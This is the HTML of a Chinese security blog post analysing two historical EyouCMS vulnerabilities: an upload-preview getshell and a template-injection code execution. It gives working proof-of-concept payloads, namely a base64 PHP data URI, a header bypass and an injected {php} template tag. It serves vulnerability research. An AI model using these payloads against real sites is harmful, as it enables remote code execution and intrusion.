@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="eyoucms历史漏洞分析"/>
+
+
+
+
+  <meta name="keywords" content="php代码审计," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/04/03/eyoucms历史漏洞分析/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="eyoucms历史漏洞分析">
+<meta property="og:url" content="https://glotozz.github.io/2020/04/03/eyoucms%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/04/04/8y3YPUhrV94CnQa.png">
+<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-04_09-58-17.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/04/DT9Gwz3opvkRKiU.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/04/p7lr1dbLmAFNkfX.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/04/zLP9rDafkWJwHOS.png">
+<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-04_11-45-34.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/04/ZvzNf2WIuki3dOy.png">
+<meta property="article:published_time" content="2020-04-03T15:28:12.000Z">
+<meta property="article:modified_time" content="2020-04-04T08:12:04.056Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="php代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/04/04/8y3YPUhrV94CnQa.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> eyoucms历史漏洞分析 - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          eyoucms历史漏洞分析
+        
+      </h1>
+
+      <time class="post-time">
+          Apr 03 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#环境搭建">环境搭建</a></li>
+<li><a href="#历史漏洞一-eyoucms_v10存在前台getshell">历史漏洞一-Eyoucms_v1.0，存在前台getshell</a></li>
+<li><a href="#eyoucms-142-任意代码执行漏洞">EyouCMS &lt;1.4.2 任意代码执行漏洞</a></li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<p>打算找个cms漏洞挖掘，找到了Eyoucms，打算先分析历史漏洞，再对最新版本进行挖掘。</p>
+<h4><span id="环境搭建">环境搭建</span></h4><p> EyouCms是基于TP5.0框架为核心开发的免费+开源的企业内容管理系统 。</p>
+<blockquote>
+<p><a href="https://www.eyoucms.com/" target="_blank" rel="noopener">https://www.eyoucms.com/</a> </p>
+</blockquote>
+<h4><span id="历史漏洞一-eyoucms_v10存在前台getshell">历史漏洞一-Eyoucms_v1.0，存在前台getshell</span></h4><p><code>v_1.1.3</code>也存在</p>
+<p><code>application/api/controller/Uploadify.php</code></p>
+<p><code>preview()</code>方法，提供图片预览功能</p>
+<p><img src="https://i.loli.net/2020/04/04/8y3YPUhrV94CnQa.png" alt="Snipaste_2020-04-04_09-48-43.png"></p>
+<p>根据正则提取数据，简单分析就可以构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image&#x2F;php;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-04_09-58-17.png" alt="Snipaste_2020-04-04_09-58-17"></p>
+<p>注意这里的路径</p>
+<p><img src="https://i.loli.net/2020/04/04/DT9Gwz3opvkRKiU.png" alt="Snipaste_2020-04-04_10-00-23.png"></p>
+<h4><span id="eyoucms-lt142-任意代码执行漏洞">EyouCMS &lt;1.4.2 任意代码执行漏洞</span></h4><p><img src="https://i.loli.net/2020/04/04/p7lr1dbLmAFNkfX.png" alt="Snipaste_2020-04-04_10-28-46.png"></p>
+<p><code>application/api/controller/Ajax.php</code></p>
+<p><img src="https://i.loli.net/2020/04/04/zLP9rDafkWJwHOS.png" alt="Snipaste_2020-04-04_10-35-15.png"></p>
+<p>绕过<code>IS_AJAX_POST</code></p>
+<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-04_11-45-34.png" alt="Snipaste_2020-04-04_11-45-34"></p>
+<p>在包中加上<code>X-Requested-With: XMLHttpRequest</code></p>
+<p>这里可以模板注入，渲染的模板为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;eyou:memberlist $key&#x3D;&#39;$val&#39; js&#x3D;&#39;on&#39;&#125;$htmlcode&#123;&#x2F;eyou:memberlist&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过尝试，<code>$key=&#39;$val&#39;</code>可以成功注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;eyou:memberlist &#125;&#x3D;&#39;&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;&#39; js&#x3D;&#39;on&#39;&#125;$htmlcode&#123;&#x2F;eyou:memberlist&#125;</span><br></pre></td></tr></table></figure>
+
+<p>=&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;&#125;&quot;: &quot;&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>=&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ9IjogIntwaHB9cGhwaW5mbygpO3svcGhwfSJ9</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/04/04/ZvzNf2WIuki3dOy.png" alt="Snipaste_2020-04-04_12-37-14.png"></p>
+<h4><span id="参考链接">参考链接</span></h4><p> <a href="https://www.cnblogs.com/r00tuser/p/9405870.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/9405870.html</a> </p>
+<p> <a href="http://www.lovei.org/archives/EyouCMS-SSTI.html" target="_blank" rel="noopener">http://www.lovei.org/archives/EyouCMS-SSTI.html</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> php代码审计</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2020/04/04/eyoucms-v1-4-4%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">eyoucms_v1.4.4漏洞挖掘</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2020/04/02/buuctf-wp/">
+        <span class="next-text nav-default">buuctf-wp</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  </body>
+</html>
